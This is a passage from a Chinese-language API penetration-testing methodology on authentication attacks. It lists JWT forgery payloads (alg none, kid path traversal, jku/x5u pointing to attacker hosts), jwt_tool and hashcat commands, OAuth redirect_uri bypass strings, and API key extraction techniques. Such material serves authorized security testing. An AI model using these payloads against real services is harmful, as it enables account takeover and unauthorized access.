## 三、认证测试（高级）

### 3.1 认证方式识别
| 认证方式 | 特征 | 攻击方法 |
|---------|------|---------|
| API Key | X-API-Key/ApiKey/key参数 | Key泄露、弱Key爆破、遍历 |
| Bearer Token (JWT) | Authorization: Bearer xxx | 见3.2 JWT攻击矩阵 |
| Basic Auth | Authorization: Basic base64 | 弱密码爆破 |
| OAuth 2.0/OIDC | Bearer + Code/Client Credentials | 见3.4 OAuth深度攻击 |
| Session Cookie | Cookie: session=xxx | 劫持/固定/前缀切换 |
| HMAC签名 | Signature/X-Signature头 | 签名算法绕过/时间戳重放（见13.3） |
| mTLS | 客户端证书 | 证书提取/伪造/SPIFFE身份混淆 |
| API Key in URL | ?api_key=xxx | Referer/日志泄露 |
| PASETO/Biscuit | 自包含签名Token | 密钥爆破（比JWT安全，少见） |

### 3.2 JWT攻击矩阵（高级）

#### 3.2.1 基础算法攻击
```json
// 1. alg=none
// Header: {"alg":"none","typ":"JWT"}，删掉签名段，改payload

// 2. HS256弱密钥爆破
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt
jwt_tool jwt.txt -C -d wordlist.txt

// 3. RS256→HS256公钥混淆
// 拿公钥（/jwks、/.well-known/jwks.json、认证中间件）当HMAC密钥签名
python3 jwt_tool.py <token> -X k -pk public.pem
```

#### 3.2.2 Header注入攻击
```json
// 4. kid注入（路径遍历/类型混淆）
{"kid":"../../../../dev/null","alg":"HS256"}    // 用空字节文件当密钥
{"kid":"/proc/self/environ","alg":"HS256"}     // 用环境变量当密钥（内容可预测）
{"kid":"1","alg":"HS256","jku":"http://attacker/jwks.json"}
{"kid":"../public/verification.key","alg":"HS256"}

// 5. jku/x5u注入（远程密钥）
{"jku":"http://attacker.com/jwks.json","alg":"RS256"}
{"x5u":"http://attacker.com/cert.pem"}

// 6. 密钥类型混淆（CVE-2022-21449类）
// RSA公钥当HMAC密钥 / EC曲线攻击 / 仅验签不验类型
{"alg":"ES256","kid":"rsa_key.pub"}  // EC签名套到RSA公钥上
```

#### 3.2.3 Claims与业务逻辑攻击
```json
// 7. 关键claim缺失/篡改
// exp删除/置未来、iat置现在、jti复用（重放检测绕过）、aud缺失（跨应用Token复用）
// 只验签名不验claim：改 exp/role/scope 后重签

// 8. 敏感数据泄露
// payload中直接带 passwordHash/apiKey/refreshToken（实践中发现过）
// 用 jwt_tool -C 检测 payload 泄露

// 9. JWT缓存/会话混淆
// 同一JWT在多个子域/环境复用（staging token打production）
// Cookie vs Bearer 双重认证：仅验其一

// 10. Refresh Token滥用
// 不轮换 → 被盗可无限续期
// 不绑定client_id → 跨应用换发
// 无过期 → 永续session
```

#### 3.2.4 JWT测试工具流
```bash
jwt_tool <token> -T                 # 全量漏洞扫描
jwt_tool <token> -X a               # alg:none
jwt_tool <token> -X k -pk pub.pem   # 公钥混淆
jwt_tool <token> -X i -I kid -V "path"
python3 jwt_forgery.py              # kid路径遍历变体批量
# Burp插件：JWT Editor / Authorization (PortSwigger) / JSON Web Tokens
```

### 3.3 API Key攻击
```
- 硬编码于移动端JS/APK/IPA/小程序wxapkg
- Key在URL中泄露到Referer/日志/CDN缓存
- Key无过期、不绑定IP/Referer/作用域
- 弱Key/可猜测Key（UUIDv1、时间戳、短随机）

提取方法：
- 前端JS搜索 api[_-]?key/secret/token/Authorization
- SourceMap还原（.map文件）→ 全量源码搜索密钥
- APK反编译（jadx）字符串/资源
- GitHub/GitLab泄露搜索（trufflehog/gitleaks）
- 云环境变量/env文件（/actuator/env）

签名密钥特殊场景：
- 若Key带签名（HMAC-SHA256），尝试爆破弱签名密钥
- 尝试移除签名段看是否仍被接受
- 尝试Key+Timestamp+Nonce机制的重放（Nonce可复用/时间戳宽松）
```

### 3.4 OAuth 2.0/OIDC深度攻击

#### 3.4.1 授权码流程攻击
```
# 1. redirect_uri绕过变体（超越基础开放重定向）
redirect_uri=https://target.com.attacker.com/callback
redirect_uri=https://target.com/callback/../redirect?url=attacker.com
redirect_uri=https://target.com/<EMAIL-REDACTED>
redirect_uri=https://target.com/callback#@attacker.com
redirect_uri=https://target.com.evil.com            # 前缀后缀拼接
redirect_uri=https://target.com/..%2f..%2fattacker.com
redirect_uri=https://target.com:<EMAIL-REDACTED>
# 反斜杠/双编码变体：/callback%252f../attacker.com
# 多个redirect_uri参数 / 数组参数

# 2. 授权码劫持（无PKCE）
# 攻击者注册恶意client，拿到受害者授权码后在自身client换Token
# 或拦截授权码 → 证明PKCE缺失

# 3. state参数攻击
# state缺失/可预测/静态 → 登录CSRF，绑定攻击者账号
# state与session不绑定 → 替换state实现账号固定

# 4. scope提权
# 请求额外scope（admin、openid+profile+email）
# 授权服务器不过滤请求scope
```

#### 3.4.2 Token端点攻击
```
# 5. client_secret弱/泄露
# 公共客户端(SPA/移动)不应有secret；有=可冒充
# secret泄露在JS/APK/GitHub

# 6. Refresh Token混淆（Token Confusion）
# 用access token当refresh token换新
# 跨client复用refresh token
# refresh token不轮换→被盗永续

# 7. Token在URL/日志泄露
# access token放query参数 → Referer/日志/CDN泄露
# 隐式流程fragment泄露

# 8. IdP混淆攻击（mix-up attack）
# 多IdP场景：把redirect给其他IdP，用弱IdP的Token
# 换发endpoint/issuer不校验
```

#### 3.4.3 OIDC/SSO攻击
```
# 9. 恶意Issuer注入
# token的iss不校验 → 自建IdP签发admin Token
# JWKS URL可控（jku）→ 提供攻击者公钥

# 10. 会话固定/账号接管
# 登录后session不重置 → 攻击者预置session
# 邮箱未验证直接绑定OIDC身份
# sub跨IdP冲突（同一sub不同IdP=账号混淆）

# 11. Token内身份信任
# 直接用token的email/phone当用户标识而不二次校验
# 修改claim可越权（配合签名绕过）
```

### 3.5 会话/令牌管理攻击
```
- Session固定（登录前后session ID不变）
- Session并发不限制（多端登录无告警）
- Cookie缺少HttpOnly/Secure/SameSite → XSS/网络窃取
- 令牌存储不安全（localStorage可被XSS读）
- 密码重置/邮箱验证Token可预测/不过期/不绑定用户（联动IDOR）
- 注销不吊销（Token失效需黑名单/短TTL）
```

